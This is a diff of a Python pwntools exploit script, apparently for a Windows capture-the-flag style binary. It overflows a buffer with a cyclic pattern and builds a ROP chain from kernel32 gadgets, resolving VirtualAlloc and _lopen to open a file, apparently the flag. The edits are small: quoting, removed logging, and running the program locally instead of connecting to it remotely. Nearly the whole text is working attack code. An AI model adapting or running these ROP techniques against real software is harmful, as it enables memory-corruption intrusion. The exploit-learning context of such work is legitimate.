@@ -50,7 +50,7 @@ def sale(pl, name, cash):
 def land(pl):    
     r.sendline('3')
     r.recvuntil('? ')    
-    buf += cyclic( 0x400 - len(buf))    
+    buf = cyclic( 0x400 )    
     r.send(buf)
     r.recvuntil('?\n')
 
@@ -117,9 +117,7 @@ def exploit(r):
     #Get gadgets from the application
     pe = PE("C:\\Divided\\kernel32.dll")
     rop = ROP(pe, load_all=True)
-    log.info("Number of gadgets loaded: %d" % len(rop.gadgets) )
-    log.info("Looking for pop instructions")
-    
+        
     #Resolve VirtualAlloc address
     virtual_alloc_off = rop.resolve("VirtualAlloc")
     k32_base = money - virtual_alloc_off
@@ -198,7 +196,7 @@ def exploit(r):
     buf += p64(0)        #Read flag for file open    
     
     #Add file open call
-    lopen_off = rop.resolve("_lopen")
+    lopen_off = rop.resolve('_lopen')
     buf += p64(lopen_off + k32_base) 
     
     #Skip over garbage
@@ -206,7 +204,7 @@ def exploit(r):
     buf += "C" * 8          #Garbage that gets overwritten
     
     rax_gadg = None
-    gadget_iter = rop.search_iter( dst_regs=["ecx"], src_regs=["eax", "r9d"], ops=["mov"] )
+    gadget_iter = rop.search_iter( dst_regs=['ecx'], src_regs=['eax', 'r9d'], ops=['mov'] )
     gadget_list = list(gadget_iter)
     for gadget in gadget_list:
         if gadget.move == 0x2c:
@@ -302,7 +300,7 @@ def exploit(r):
     
     #Skip over garbage
     buf += p64(rdx_rop)
-    buf += "C" * 8          #Garbage that gets overwritten
+    buf += 'C' * 8          #Garbage that gets overwritten
     
     #Get pop rsi gadget
     rsi_gadg = None
@@ -344,8 +342,8 @@ def exploit(r):
 if __name__ == "__main__":
 
     bin_path = 'C:\\Divided\\ConsoleApplication2.exe' 
-    r = remote('127.0.0.1', 4444)
-    #r = process([bin_path])
+    #r = remote('127.0.0.1', 4444)
+    r = process([bin_path])
     #pid = util.proc.pidof(p)[0]
     
     #t = Thread(target = bugIdFunc, args = ([pid]))
